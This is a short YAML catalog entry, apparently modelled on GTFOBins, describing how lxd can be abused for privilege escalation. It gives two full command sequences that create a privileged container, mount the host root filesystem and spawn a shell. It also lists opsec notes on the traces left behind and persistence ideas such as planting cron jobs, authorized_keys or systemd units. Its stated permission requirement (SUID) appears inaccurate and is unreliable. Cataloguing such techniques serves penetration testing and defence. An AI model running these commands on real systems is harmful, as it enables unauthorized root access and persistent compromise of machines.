---
name: lxd
capabilities:
- exec
- spawn
required_permissions:
  level: suid
  notes: Requires SUID bit set on the binary.
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    lxc init ubuntu:16.04 x -c security.privileged=true
    lxc config device add x x disk source=/ path=/mnt/ recursive=true
    lxc start x
    lxc exec x /bin/sh
  notes: The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    lxc image import ./alpine*.tar.gz --alias x
    lxc init x x -c security.privileged=true
    lxc config device add x x disk source=/ path=/mnt/ recursive=true
    lxc start x
    lxc exec x /bin/sh
  notes: |-
    This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

    ```
    git clone https://github.com/saghul/lxd-alpine-builder
    cd lxd-alpine-builder
    sudo ./build-alpine -a i686
    ```
references:
- https://gtfobins.github.io/gtfobins/lxd/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
